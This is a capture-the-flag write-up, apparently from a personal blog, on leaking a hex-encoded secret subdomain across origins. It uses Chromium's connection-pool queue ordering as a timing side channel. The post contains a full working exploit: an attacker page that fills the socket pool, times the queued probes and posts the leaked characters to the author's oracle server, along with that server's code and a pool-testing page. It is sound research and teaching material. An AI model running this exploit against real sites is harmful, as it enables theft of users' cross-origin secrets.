---
title: "Twitter Chall"
date: 2025-09-15T14:39:47+02:00
draft: false
tags: ["connection pool","chrome","xsleak"]
---
Last week while browsing on X I stumbled upon this challenge.

Knowing the author and his love for connection pools I wanted to give it a shot and I was able to get the first blood 🩸.

The challenge source code is pretty minimal and easy to understand.
From the description of the challenge we can get an idea of what awaits us.

{{< tweet url="https://x.com/salvatoreabello/status/1963274974388441268" >}}

# CHALLENGE INTRODUCTION

We are presented with a website with 2 routes and a middleware:

- `/` renders `index.ejs`
- `/report`  reports a URL to the Puppeteer bot
- The middleware sets the following CSP ``res.setHeader("Content-Security-Policy", `default-src 'none'; script-src 'nonce-${nonce}; connect-src *.${DOMAIN}:${PORT}; base-uri 'none'; frame-ancestors 'none'\`);``

Let’s look at `index.ejs`, as so far there has been nothing relevant to be seen

`index.ejs`

```html
...
<body>
    <script nonce="<%= nonce %>">
        const DOMAIN = "<%= DOMAIN %>";
        const PORT = "<%= PORT %>";

        const result = document.getElementById("result");

        const toHex = s => [...new TextEncoder().encode(s)].map(b => b.toString(16).padStart(2,'0')).join('');

        window.onhashchange = () => {
            let flag = localStorage.getItem("flag") || "flag{fake_flag_for_testing}";
            fetch(`http://${toHex(flag)}.${DOMAIN}:${PORT}`)
            .finally(() => result.innerText = "request sent")
        }
    </script>
</body>
</html>
```

Here lies the core of the challenge, our goal is to leak the request issued from this website, but we can only do it cross-origin and if you are wondering what the onhashchange does in this context, it’s just a way of making this challenge less painful. Let’s see what the bot does to get the full picture.

{{< details summary="bot.js" >}}
```jsx    
const puppeteer = require("puppeteer");

const DOMAIN = process.env.DOMAIN || 'example.localhost';
const PORT = process.env.PORT || 1337;
const SITE = process.env.SITE || `http://${DOMAIN}:${PORT}`;

const FLAG = process.env.FLAG || "flag{fake_flag}";
const FLAG_REGEX = /^flag{.+}$/;

const sleep = async (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const visit = (url) => {
    return new Promise(async (resolve, reject) => {
        if (!FLAG_REGEX.test(FLAG)) {
            return reject(new Error("Error: Flag does not match flag regex, contact the author if this is on remote"));
        }

        let browser, page, context;
        try {
            browser = await puppeteer.launch({
                headless: true,
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-gpu',
                    '--no-first-run',
                    '--disable-default-apps',
                    '--disable-extensions'
                ],
                dumpio: true,
                pipe: true,
                executablePath: process.env.PUPPETEER_EXECUTABLE_PATH
            });

            context = await browser.createBrowserContext();

            page = await context.newPage();

            console.log(`The admin will visit ${SITE} first, and then ${url}`);

            await page.goto(`${SITE}`, { waitUntil: "domcontentloaded", timeout: 5000 });
            await sleep(100);

            await page.evaluate((flag) => {
                localStorage.setItem('flag', flag);
            }, FLAG);

            console.log(`localStorage.setItem('flag', '${FLAG}')`)

            await sleep(500);
            await page.close();

        } catch (err) {
            console.error(err);
            if (browser) await browser.close();
            return reject(new Error("Error: Setup failed, if this happens consistently on remote contact the admin"));
        }

        resolve("The admin will visit your URL soon");

        try {
            page = await context.newPage();

            await page.goto(url, { waitUntil: "domcontentloaded", timeout: 5000 });
            await sleep(120_000);
        } catch (err) {
            console.error(err);
        }

        if (browser) await browser.close();
    });
};

module.exports = { visit };
```
{{< /details >}}
    

The bot code is relatively easy, it will perform the following actions:

- Create a new tab in a new browsing context
- Visit the challenge website
- Set the flag in the localstorage, which is used in index.ejs to perform the fetch
- Close the previous page
- Open a new page to the attacker website and sleeps for 2 minutes

When you encounter these kinds of challenges, usually what you need is an [xsleak](https://xsleaks.dev/) or in some cases you have to find new ones

## CONNECTION POOL TO THE RESCUE

Since we are dealing with fetch requests and cannot directly measure cross‑origin response timing, so we leverage the global [connection pool](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)  as a timing side‑channel.

The general idea is the following:

> Browsers use sockets to communicate with servers. As the operating system and the hardware it runs on have limited resources, browsers have to impose a limit.
If all sockets are occupied, no other requests can be made until one is freed. This can be exploited to measure the loading time of a request from another page or to detect if a resource has been requested.
> 

If we go further into the connection pool implementation, we can see that when the connection pool is full of pending requests which are not resolved yet, the requests that will be created next will be put into a queue [with some criteria](https://blog.babelo.xyz/posts/css-exfiltration-under-default-src-self/#stalled-requests-priorities--more).

It becomes clearer that at this point we need to abuse the queued request in the connection pool but we still need to figure out how to.

## ABUSING THE QUEUE

Now we need to understand how we can abuse the queue. We know that if we have 256 requests pending and we add one more connection it will be added to the queue.

Suppose that after filling the pool we create a new fetch to `http://zz.example.com:80`  what our scenario will look like is the following.

{{< svg src="images/post2/svg/step1.svg" >}}

$$
\text{connection pool full and sorted queued requests}
$$

Now suppose right after we create a new fetch to `http://aa.test.com:80` our scenario will be like the following.

{{< svg src="images/post2/svg/step2_(1).svg" >}}

$$
                                                \text{Connection Pool full and sorted request queued}
$$

Ordering is by tuple `{port, scheme, host}`; among equal scheme/port, hosts resolve [lexicographically](https://source.chromium.org/chromium/chromium/src/+/main:net/socket/client_socket_pool.h).

Now comes the interesting part, remember that the challenge handles hash change by re-fetching the secret subdomain we need to leak, it’s worth also remembering that under normal circumstances changing the fragment (`#`) in the URL does not issue a new request to the webpage.

I spent some time trying to weaponize the queue ordering, after all it’s just a sorting based on some criteria what could go wrong right?

Well actually why don’t we use the ordering to our advantage, let’s take a look at the following scenario

{{< svg src="images/post2/svg/step3_(1).svg" >}}


Now at this point let’s say that from `attacker.com` we make 3 fetch requests which will go into the queue, we are using the following domains

- `fa.0xalessandro.me`
- `aa.0xalessandro.me`
- `fz.0xalessandro.me`

{{< svg src="images/post2/svg/step3_(2).svg" >}}


As you can see the secret location is pinched in between `fa` and `fz` since `scheme` and `port` are the same, the check is done alphabetically on the full domain. At this point we need a way to determine between which extremes the fetch request is encapsulated.

Now an important thing is that if only 1 request from the connection pool is either aborted or gets resolved earlier while the other 255 are sleeping, the queue will be emptied sequentially one request at a time.

This creates timing differences that we can exploit, while `aa` and `fa` will have almost no delay in between, when `fa` gets resolved then `flag` will need to be resolved creating a big enough gap that we can confidently detect.

 

{{< svg src="images/post2/svg/final.svg" >}}


As a general recap:

1. **Open the victim page and keep a window handle.**
2. **Fill the global connection pool** with 255 long-lived requests to your oracle.
3. **Arm one fused request** that ends soon to free exactly one socket.
4. **Queue 16 probe fetches** for `0-9, a-f` as subdomains against your oracle.
5. **Trigger a `hashchange` on the victim** so its fetch joins the queue between two probes.
6. **Wait for the fuse to fire** so the queue drains one-by-one in sorted order.
7. **Record probe arrival times** and compute gaps between consecutive arrivals.
8. **Select the maximum gap**; the character on the left (LHS) is the victim’s hex nibble.

Here’s the code I’ve used, tweaked a bit with the help of gpt, i was too lazy to make it more efficient and leak more characters at once.

{{< details summary="index.html" >}} 
```html
<!DOCTYPE html>
<meta charset="utf-8" />
<title>Hex Queue-order leak (0-f, *.0xalessandr0.me)</title>
<style>
    body {
        font-family: system-ui, sans-serif;
        padding: 12px
    }

    button {
        margin: 4px 6px;
        padding: 8px 10px
    }

    #log {
        margin-top: 10px;
        font-family: ui-monospace, Menlo, Consolas, monospace;
        white-space: pre-wrap
    }

    #flag-display {
        margin: 10px 0;
        padding: 10px;
        background: #f0f0f0;
        border-radius: 4px;
        font-family: ui-monospace, Menlo, Consolas, monospace;
        font-size: 1.2em;
    }
</style>

<h3>Detect victim insertion between our hex chars (no sleeps)</h3>
<div id="flag-display">Flag: <span id="flag-text"></span></div>
<div>
    <label>Fill count <input id="fill" type="number" min="200" max="256" value="255"></label>
    <label>Fuse (ms) <input id="fuse" type="number" min="100" max="60000" value="5000"></label>
    <label>Min gap (ms) <input id="mingap" type="number" min="10" max="5000" value="50"></label>
    <label>Max wait (ms) <input id="maxwait" type="number" min="1000" max="60000" value="30000"></label>
</div>
<div>
    <button onclick="prep()">Step 1: open victim</button>
    <button onclick="fill()">Step 2: fill holders + fuse</button>
    <button onclick="run()">Step 3: queue hex + hashchange & detect</button>
    <button onclick="autoRun()">Auto Run Full Cycle</button>
</div>
<pre id="log"></pre>

<script>
    const VICTIM_URL = "http://challenge-01.babelo.xyz";
    const BASE = "0xalessandr0.me";
    const ORACLE = `http://${BASE}`;        // :80 implied
    const HEX_CHARS = '0123456789abcdef';   // 16 hex characters

    // Global flag variable to store discovered characters
    let flag = '666c61677b676a326534737972316768743f7d';
    //flag{gj2e4syr1ght?}

    let ws, w, round = 0, fuseAt = 0;
    // store earliest arrival per character (server timestamp, ms)
    const times = new Map();

    const Z = ms => new Promise(r => setTimeout(r, ms));
    const L = (...a) => document.querySelector('#log').append(a.join(' ') + '\n');

    function wsEnsure() {
        return new Promise((res, rej) => {
            if (ws && ws.readyState === WebSocket.OPEN) return res();
            ws = new WebSocket(`ws://${BASE}/ws`);
            ws.onopen = res;
            ws.onerror = rej;
            ws.onmessage = e => {
                try {
                    const m = JSON.parse(e.data);
                    if (m.type === 'char' && +m.round === round) {
                        // keep earliest arrival for each character
                        if (!times.has(m.char)) times.set(m.char, m.t);
                    }
                } catch { }
            };
        });
    }

    function holdLong() {
        // vary subdomain to avoid ~6-per-host H1 limits
        const sub = Math.random().toString(36).slice(2, 8);
        fetch(`http://${sub}.${BASE}/hold?ms=60000`, { mode: 'no-cors', cache: 'no-store' }).catch(() => { });
    }

    function holdFuse(ms) {
        fuseAt = performance.now() + ms;
        const sub = 'f' + Math.random().toString(36).slice(2, 8);
        fetch(`http://${sub}.${BASE}/hold-fuse?fuse=${ms}`, { mode: 'no-cors', cache: 'no-store' }).catch(() => { });
    }

    function queueChar(c) {
        fetch(`http://${flag}${c}.${BASE}/char/${round}/${c}`, { mode: 'no-cors', cache: 'no-store' }).catch(() => { });
    }

    function triggerRemote() {
        if (!w || w.closed) w = open(VICTIM_URL);
        let hex = (Math.random() + 1).toString(36).substring(7);

        w.location = `${VICTIM_URL}#${hex}`;
        L('triggered victim hashchange');
    }

    async function reportFlag(newChar) {
        flag += newChar;
        document.getElementById('flag-text').textContent = flag;
        console.log(`🎯 Discovered flag character: ${newChar}`);
        console.log(`📍 Current flag: ${flag}`);

        // Report to remote server
        try {
            await fetch(`http://${BASE}/flag`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ char: newChar, flag: flag }),
                mode: 'cors'
            });
            L(`✓ Reported character '${newChar}' to server`);
        } catch (err) {
            L(`✗ Failed to report character '${newChar}': ${err.message}`);
        }
    }

    async function prep() {
        await wsEnsure();
        w = open(VICTIM_URL); await Z(12000);
        L('victim opened; WS ready');
    }

    async function fill() {
        times.clear();
        const N = +document.getElementById('fill').value || 254;
        for (let i = 0; i < N; i++) holdLong();
        const fuse = +document.getElementById('fuse').value || 5000;
        holdFuse(fuse);
        L(`holders=${N} + fused; fuse in ${fuse}ms on ${BASE}`);
    }

    function analyze() {
        // Build ordered arrays for the characters we actually saw
        const seen = [...times.entries()].sort((a, b) => HEX_CHARS.indexOf(a[0]) - HEX_CHARS.indexOf(b[0]));
        const chars = seen.map(([c]) => c);
        const t = seen.map(([, ts]) => ts);

        // Print raw timeline (useful for debugging)
        const t0 = t[0];
        L('arrivals (char@Δms): ' + seen.map(([c, ts]) => `${c}@${(ts - t0).toFixed(0)}`).join(', '));

        // Compute gaps between consecutive characters we have
        const gaps = [];
        for (let i = 0; i < seen.length - 1; i++) {
            gaps.push({ i, between: `${chars[i]}-${chars[i + 1]}`, ms: t[i + 1] - t[i] });
        }
        L('gaps(ms): ' + gaps.map(g => `${g.between}:${g.ms.toFixed(0)}`).join(' | '));

        // Robust pick: max gap; require it to be >= max(minGap, median + 3*MAD)
        const minGap = +document.getElementById('mingap').value || 50;
        const msList = gaps.map(g => g.ms).sort((a, b) => a - b);
        const median = msList[Math.floor(msList.length / 2)] || 0;
        const medAbsDevs = msList.map(x => Math.abs(x - median)).sort((a, b) => a - b);
        const MAD = medAbsDevs[Math.floor(medAbsDevs.length / 2)] || 1;

        let best = gaps.reduce((a, b) => a.ms >= b.ms ? a : b, { ms: -1 });
        const thresh = Math.max(minGap, median + 3 * MAD);

        const ok = best.ms >= thresh;
        return { chars, gaps, best, ok, median, MAD, thresh };
    }

    async function run() {
        round++; times.clear();

        // queue our 16 hex characters (all pending while pool full)
        for (let i = 0; i < HEX_CHARS.length; i++) {
            queueChar(HEX_CHARS[i]);
        }

        // fire victim slightly before fuse so everything is pending together
        const lead = 50;
        await Z(Math.max(0, fuseAt - performance.now() - lead));
        triggerRemote();

        // WAIT UNTIL WE HAVE ALL 16 (or until generous deadline)
        const maxWait = +document.getElementById('maxwait').value || 30000;
        const t0 = performance.now();
        while (times.size < 16 && performance.now() - t0 < maxWait) {
            await Z(10);
        }

        const { chars, gaps, best, ok, median, MAD, thresh } = analyze();
        L(`median=${median.toFixed(0)} ms, MAD=${MAD.toFixed(0)} ms, threshold=${thresh.toFixed(0)} ms`);
        if (!ok) {
            L('⇒ inconclusive (raise Max wait / Fuse, or rerun)');
            return null;
        }
        const [LHS, RHS] = best.between.split('-');
        L(`⇒ victim inserted between ${LHS} and ${RHS} (max gap ${best.ms.toFixed(0)} ms)`);
        L(`✓ Remote character is: ${LHS}`);

        // Report the discovered character
        await reportFlag(LHS);

        return LHS;
    }

    async function autoRun() {
        L('🚀 Starting automatic exploit...');

        // Step 1: Prepare
        await prep();
        await Z(500);

        // Step 2: Fill
        await fill();
        await Z(500);

        // Step 3: Run detection
        const leakedChar = await run();

        if (leakedChar) {
            L(`✅ Successfully leaked character: ${leakedChar}`);
            L(`📋 Current flag: ${flag}`);
        } else {
            L('❌ Failed to leak character, may need to retry');
        }
    }

    // Check for autostart parameter
    window.addEventListener('DOMContentLoaded', async () => {
        const params = new URLSearchParams(window.location.search);
        if (params.has('autostart')) {
            L('🤖 Autostart detected, beginning exploit in 2 seconds...');
            await Z(2000);
            await autoRun();
        }
    });
</script>
```
{{< /details >}}

    
{{< details summary="server.js" >}}
```jsx
// server.js
// npm i express express-ws cors body-parser
const express = require('express');
const cors = require('cors');
const expressWs = require('express-ws');
const bodyParser = require('body-parser');

const app = express();
expressWs(app);
app.use(cors());
app.use(bodyParser.json());

const clients = new Set();
const tell = m => { const s = JSON.stringify(m); for (const ws of clients) try { ws.send(s); } catch { } };

// Store leaked flag
let leakedFlag = '';

// Long hold (fills a socket)
app.get('/hold', (req, res) => {
    const ms = Math.max(1000, Math.min(600000, +req.query.ms || 60000));
    res.status(200).set({
        'Content-Type': 'text/plain',
        'Cache-Control': 'no-store',
        'Connection': 'keep-alive',
        'Transfer-Encoding': 'chunked',
        'Access-Control-Allow-Origin': '*',
    });
    res.flushHeaders?.();
    res.write('HOLD\n');
    setTimeout(() => { try { res.end('TIMEOUT\n'); } catch { } }, ms).unref();
    req.on('close', () => { try { res.end(); } catch { } });
});

// Fused hold: actually drops THIS TCP socket at fuse=ms → frees exactly one slot
app.get('/hold-fuse', (req, res) => {
    const ms = Math.max(50, Math.min(60000, +req.query.fuse || 5000));
    res.status(200).set({
        'Content-Type': 'text/plain',
        'Cache-Control': 'no-store',
        'Connection': 'keep-alive',
        'Transfer-Encoding': 'chunked',
        'Access-Control-Allow-Origin': '*',
    });
    res.flushHeaders?.();
    res.write('FUSE\n');
    setTimeout(() => { try { res.socket?.destroy(); } catch { } }, ms);
    req.on('close', () => { try { res.end(); } catch { } });
});

// Fast character endpoint: replies immediately (no holding). We timestamp ARRIVAL.
// Now supports both digits and hex chars
app.get('/char/:round/:char', (req, res) => {
    const t = Number(process.hrtime.bigint() / 1_000_000n); // ms
    const char = req.params.char; // Can be 0-9 or a-f
    tell({ type: 'char', round: +req.params.round, char: char, t, host: req.headers.host });
    res.set({
        'Access-Control-Allow-Origin': '*',
        'Cache-Control': 'no-store',
        'Connection': 'close'
    });
    res.end('OK');
});

// Flag reporting endpoint
app.post('/flag', (req, res) => {
    const { char, flag } = req.body;
    if (char) {
        leakedFlag += char;
        console.log(`[FLAG] New character discovered: '${char}'`);
        console.log(`[FLAG] Current flag: ${leakedFlag}`);
        tell({ type: 'flag', char, currentFlag: leakedFlag });
    }
    res.set('Access-Control-Allow-Origin', '*');
    res.json({ success: true, currentFlag: leakedFlag });
});

// Get current flag status
app.get('/flag', (req, res) => {
    res.set('Access-Control-Allow-Origin', '*');
    res.json({ flag: leakedFlag, length: leakedFlag.length });
});

// Sanity
app.get('/fast', (req, res) => { res.set('Access-Control-Allow-Origin', '*'); res.end('OK'); });

// WebSocket (telemetry)
app.ws('/ws', (ws) => {
    clients.add(ws);
    ws.on('close', () => clients.delete(ws));
    ws.on('error', () => clients.delete(ws));
});

// Serve HTML file if requested
app.get('/', (req, res) => {
    res.set('Access-Control-Allow-Origin', '*');
    res.send(`
        <h1>Hex Character Leak Oracle Server</h1>
        <p>Server is running on port 80</p>
        <p>Current leaked flag: <code>${leakedFlag || '(none yet)'}</code></p>
        <p>Endpoints:</p>
        <ul>
            <li>GET /hold - Long hold endpoint</li>
            <li>GET /hold-fuse - Fused hold endpoint</li>
            <li>GET /char/:round/:char - Character detection (0-9, a-f)</li>
            <li>POST /flag - Report discovered character</li>
            <li>GET /flag - Get current flag status</li>
            <li>WS /ws - WebSocket for real-time updates</li>
        </ul>
    `);
});

app.listen(80, () => {
    console.log('🚀 Hex oracle server listening on :80');
    console.log('📍 Ready to detect characters 0-9 and a-f');
});
```
{{< /details >}}
    

### LHS NOTE

- When the pool frees a slot, queued requests resolve in sorted order by `{port, scheme, host}`. Your 16 probe hosts bracket the victim host.
- The largest inter-arrival gap appears where the victim is inserted. Therefore, the character immediately before that gap (the LHS) is the victim’s hex character.
- Minimal example: If probes resolve in order 8, 9, [gap], a, b... and the big gap is between 9 and a, then 9 (LHS of the gap) is the victim’s character.

### Why the timing gap appears: alphabetical host ordering

Chromium groups connections by `{port, scheme, host}` and drains queued requests in lexicographic order of the host when scheme/port match. By choosing probe subdomains that bracket the victim’s host (e.g., 8, 9, a, b …), the victim’s queued request is inserted between two of our probes. When a single fused socket frees up, the queue drains in order: probes before the victim resolve in tight succession, then there’s a larger pause while the victim’s cross-origin request completes, and finally the remaining probes resolve. The maximum inter-arrival gap therefore pinpoints the victim’s position, and the character immediately to its left (LHS) among our probes is the victim’s hex nibble.

## APPENDIX

### LAB SETUP

What you’ll need is the following:

- a domain
- a VPS if you don’t want to use your PC

What we now need to do is to try and get a feel of what happens in the browser when we interfere with the connection pool.

For the first step we need to host a sleeper webapp which will just help us have a pending request for N time we choose, it can be easily implemented in a lot of ways and won’t go into the details [ref1](https://www.notion.so/TEST-26e6f216acb880eda886eeb380118c05?pvs=21) [ref2](https://blog.babelo.xyz/posts/css-exfiltration-under-default-src-self/#go-server).

After hosting a simple sleeper and setup a wildcard A record for `*.yourdomain.tld` pointing to the same IP.

You can then host this HTML somewhere to do some hands‑on testing.

{{< details summary="code" >}}
```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <button id="fillpool" onclick="fillPool(MAX_SOCKET)">Fill the pool</button>
    <button id="add_conn" onclick="createConn()">Add 1 more connection</button>
    <button id="release_conn" onclick="releaseConn()"> Release 1 connection </button>
    <button id="release_All" onclick="releaseConn(window.count)"> Release All connection </button>
    <textarea id="log"> </textarea>
    <script>
        const MAX_SOCKET = 256
        const MYSERVER = '0xalessandr0.me'
        window.socketControllers = []
        window.count = 0;

        function log(string) {
            document.querySelector('#log').textContent += string
        }

        function createConn(prefix) {
            let unique = prefix ?? (Math.random() + 1).toString(36).substring(7);
            let controller = new AbortController();
            fetch(`http://${unique}.${MYSERVER}/hold`, {
                mode: 'no-cors',
                signal: controller.signal
            });
            window.socketControllers.push(controller);
            window.count++;
        }

        function fillPool(maxval) {
            log('\nFilling pool\n')
            for (let i = 0; i < maxval; i++) {
                createConn()
            }
            log('\nShould have finished\n')
        }

        function releaseConn(n = 1) {
            log(`Releasing ${n} connections\n`)
            for (let i = 0; i < n; i++) {
                window.socketControllers.shift().abort()
                window.count--;
            }
        }

    </script>
</body>

</html>
```
{{< /details >}}
